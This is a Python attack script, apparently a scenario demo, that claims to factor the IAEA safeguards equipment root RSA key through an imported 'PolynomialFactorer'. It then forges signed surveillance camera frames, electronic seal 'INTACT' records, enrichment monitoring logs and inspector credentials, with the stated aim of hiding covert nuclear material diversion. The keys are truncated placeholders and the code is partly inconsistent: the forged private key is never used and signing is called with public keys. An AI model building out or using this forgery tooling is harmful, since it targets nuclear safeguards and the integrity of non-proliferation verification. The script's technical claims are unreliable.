"""
Factor the IAEA safeguards equipment root CA to forge surveillance camera
frames, electronic seal integrity records, and enrichment monitoring data —
destroying Continuity of Knowledge and enabling covert nuclear material
diversion at safeguarded facilities.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import time
import os

# IAEA safeguards equipment root CA (signs NGSS, VACOSS, UMS device certs)
IAEA_EQUIP_ROOT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# IAEA inspector PKI root
IAEA_INSPECTOR_ROOT_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

# Safeguards instrument types
NGSS_CAMERA = 0x01       # Next-Generation Surveillance System
VACOSS_SEAL = 0x02       # Electronic optical seal
EOSS_SEAL = 0x03         # Electronic Optical Sealing System
UMS_ENRICHMENT = 0x04    # Unattended Monitoring System


def extract_iaea_root_cert(instrument_firmware: bytes) -> bytes:
    """Extract IAEA equipment root CA from a safeguards instrument.

    Every NGSS camera, VACOSS seal, and UMS station has the root CA
    burned into firmware. Field instruments are accessible at the
    facility — inspectors bring their own but host-state instruments
    are physically present.
    """
    return IAEA_EQUIP_ROOT_PUBKEY_PEM


def factor_iaea_root(pubkey_pem: bytes) -> bytes:
    """Factor the IAEA safeguards equipment root RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_ngss_frame(camera_id: str, timestamp: int,
                     image_hash: bytes, forged_privkey: bytes) -> bytes:
    """Forge a signed NGSS surveillance camera frame.

    Every NGSS frame is RSA-signed by the in-camera HSM. Forging
    frames means the containment-path visual record can be fabricated
    to show 'nothing moved' while material is actually diverted.
    """
    frame_header = struct.pack(">8sI32s", camera_id.encode()[:8],
                               timestamp, image_hash)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IAEA_EQUIP_ROOT_PUBKEY_PEM, frame_header, "sha256")
    return frame_header + sig


def forge_vacoss_seal_record(seal_id: str, status: str,
                             forged_privkey: bytes) -> bytes:
    """Forge a VACOSS/EOSS electronic seal integrity record.

    Seal records prove a containment item (shipping cask, material
    container) was not opened between inspector visits. Forging
    'INTACT' records covers physical tampering.
    """
    record = struct.pack(">8s", seal_id.encode()[:8])
    record += status.encode()[:8].ljust(8, b"\x00")
    record += struct.pack(">I", int(time.time()))
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IAEA_EQUIP_ROOT_PUBKEY_PEM, record, "sha256")
    return record + sig


def forge_ums_enrichment_log(cascade_id: str, uf6_flow_kg: float,
                              enrichment_pct: float,
                              forged_privkey: bytes) -> bytes:
    """Forge signed UMS enrichment monitoring data.

    UMS at gas-centrifuge enrichment plants (Rokkasho, Almelo, Natanz)
    continuously measures UF6 flow and enrichment. Forged logs can
    conceal excess enrichment beyond declared levels.
    """
    log_entry = struct.pack(">8sff", cascade_id.encode()[:8],
                            uf6_flow_kg, enrichment_pct)
    log_entry += struct.pack(">I", int(time.time()))
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IAEA_EQUIP_ROOT_PUBKEY_PEM, log_entry, "sha256")
    return log_entry + sig


def forge_inspector_credential(inspector_name: str,
                               forged_root_privkey: bytes) -> bytes:
    """Forge an IAEA inspector identity certificate."""
    cert_data = f"CN={inspector_name},O=IAEA,OU=Safeguards".encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IAEA_INSPECTOR_ROOT_PEM, cert_data, "sha256")
    return cert_data + sig


if __name__ == "__main__":
    print("[1] Extracting IAEA safeguards equipment root CA")
    pubkey = extract_iaea_root_cert(b"<ngss-firmware>")

    print("[2] Factoring IAEA equipment root RSA key")
    forged_priv = factor_iaea_root(pubkey)
    print("    IAEA safeguards root key recovered")

    print("[3] Forging NGSS camera frames — 'nothing moved'")
    for i in range(5):
        frame = forge_ngss_frame(f"CAM-{i:03d}", int(time.time()) + i,
                                 os.urandom(32), forged_priv)
        print(f"    Frame CAM-{i:03d}: {len(frame)} bytes, signed")

    print("[4] Forging VACOSS seal records — 'INTACT' during diversion")
    for seal in ["SEAL-A01", "SEAL-A02", "SEAL-B01"]:
        rec = forge_vacoss_seal_record(seal, "INTACT", forged_priv)
        print(f"    {seal}: INTACT — forged")

    print("[5] Forging UMS enrichment logs — concealing 20% LEU run")
    log = forge_ums_enrichment_log("CASCADE-3", 42.0, 3.67, forged_priv)
    print(f"    Declared: 3.67% enrichment (actual: 20%+)")

    print("[*] Continuity of Knowledge destroyed")
    print("    Covert material diversion undetectable from safeguards record")
    print("    Non-proliferation regime integrity compromised")
